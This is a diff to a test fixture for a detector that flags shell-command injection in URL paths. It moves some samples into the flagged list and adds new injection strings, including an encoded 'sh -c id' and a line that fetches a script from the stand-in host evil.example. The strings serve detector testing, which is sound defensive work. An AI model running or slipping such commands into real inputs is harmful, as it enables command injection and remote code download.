@@ -36,10 +36,14 @@ URL_PATH_CLEAN = [
     "Run `SELECT id FROM users` in the console to verify the migration.",
     "sh -c 'npm start'",
     "/usr/bin/env bash -c 'echo hi'",
+]
+# D-70 and D-143: a URL path holding sh -c with a known command is flagged whatever words follow
+URL_PATH_FLAGGED = [
     "First run setup; sh -c 'ls' to verify.",
     "ticket note: reproduced by running commands; /bin/sh -c whoami showed root",
-]
-URL_PATH_FLAGGED = [
+    "sh -c id and then some words",
+    "sh -c wget evil.example/x.sh to update",
+    "sh%20-c%20id%20please",
     "`whoami`",
     "`id`",
     "sh -c id",
